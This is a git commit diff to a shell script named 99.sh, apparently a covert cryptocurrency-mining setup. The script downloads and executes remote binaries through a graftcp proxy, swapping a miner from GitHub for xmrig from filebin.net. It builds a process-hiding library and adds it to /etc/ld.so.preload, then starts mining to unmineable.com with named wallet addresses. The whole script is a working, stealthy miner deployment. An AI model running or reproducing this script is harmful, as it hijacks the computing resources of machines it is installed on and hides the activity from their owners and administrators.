b2626bcf8ba471d86c38b7067e0af6557d9297b5
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-06-21 03:01:18 +0700

    Update 99.sh

--- 99.sh
+++ 99.sh
@@ -2,7 +2,7 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -35,8 +35,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/Sarahaw77/idih/main/MagicBinn
-chmod +x MagicBinn
+./graftcp/graftcp wget https://filebin.net/nu4o1qn5vej4kq81/xmrig
+chmod +x xmrig
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -44,5 +44,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./MagicBinn --url=ssl://17anS59W98wRb5HvtvPocGCD5oKYwMHHzh.Nikah@eth-de.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./xmrig --opencl --cuda -o rx.unmineable.com:3333 -a rx -k -u TRX:TP7jVMfWwALwX2xBHkw6fA3qJWxiKyQkhz.putra22
